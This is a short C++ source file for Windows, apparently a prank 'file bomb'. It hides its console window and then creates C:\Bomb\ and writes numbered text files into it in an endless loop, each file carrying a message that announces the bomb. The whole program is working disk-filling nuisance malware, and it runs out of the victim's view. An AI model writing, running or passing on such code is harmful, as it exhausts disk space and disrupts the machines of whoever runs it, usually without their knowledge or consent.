#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>

int main()
{
	FreeConsole();
	int h = 0;
	const char *path = "C:\\Bomb\\";
	std::string str = "This is an infinite file bomb. Unless you stop this process quickly, your system will be full of thousands of neatly numbered files.";
	_mkdir(path);
	
	while (true)
	{
		++h;
		std::ofstream Bomb;
		Bomb.open(path + std::to_string(h) + ".txt", std::ios_base::out);
		Bomb << str;
		Bomb.close();
	}
}